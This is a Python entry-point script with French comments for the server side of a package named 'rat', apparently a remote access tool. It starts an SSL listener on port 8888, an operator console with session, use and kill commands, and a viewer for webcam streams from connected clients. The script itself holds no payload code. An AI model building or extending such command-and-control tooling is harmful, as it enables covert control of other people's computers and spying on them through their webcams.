# Point d'entrée du serveur
# - lance le serveur réseau SSL
# - lance la console interactive
# - lance l'affichage du stream webcam (OpenCV)

from rat.server.server import SSLServer, SSLServerThread
from threading import Thread


def main():

    # Création du serveur sécurisé
    server = SSLServer(
        host="0.0.0.0",
        port=8888,
        server_cert="certs/cert.pem",
        server_key="certs/key.pem",
        client_cert="certs/cert.pem",
    )

    # Thread réseau : gestion des connexions clients + SSL handshake
    SSLServerThread(server).start()

    # Thread console : interface commande (sessions, use, kill, etc.)
    Thread(target=server.run_console, daemon=True).start()

    # Thread principal : affichage du stream webcam (OpenCV GUI)
    server.run_stream_display()


if __name__ == "__main__":
    main()
